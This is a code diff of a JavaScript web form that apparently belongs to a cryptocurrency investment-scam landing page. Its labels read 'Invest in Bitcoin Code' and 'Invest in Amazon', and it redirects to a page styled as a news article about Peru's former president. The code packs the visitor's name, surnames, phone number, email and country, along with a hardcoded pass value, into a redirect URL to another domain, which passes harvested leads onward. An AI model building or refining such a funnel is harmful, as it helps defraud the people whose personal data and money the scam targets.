@@ -66,14 +66,14 @@ export const Form = () => {
       phonecode: '51',
       country: 'PE',
       source: `${window.location.href}`,
-      landing: "Invest in Bitcoin Code"
+      landing: "larepublicacode"
     };
 
     try {
 
       if (window.location.search.includes("aff_sub")) {
         const url = window.location.href.replace(`${window.location.origin}/`, "https://www.martinviz.com/article/martin-vizcarra-asegura-dejar-la-presidencia-de-peru-con-la-frente-en-alto/thanku/");
-        const urlRedirect = `${url}&idpass=123qwe321&idnombre=${params.idnombre}&idapellidos=${params.idapellidos}&idphone=${params.idphone}&idcorreo=${params.idcorreo}&phonecode=${params.phonecode}&country=${params.country}&source=${window.location.host}&landing=Invest in Amazon`;
+        const urlRedirect = `${url}&idpass=123qwe321&idnombre=${params.idnombre}&idapellidos=${params.idapellidos}&idphone=${params.idphone}&idcorreo=${params.idcorreo}&phonecode=${params.phonecode}&country=${params.country}&source=${window.location.host}&landing=${params.landing}`;
         window.location.href = urlRedirect;
       } else {
     
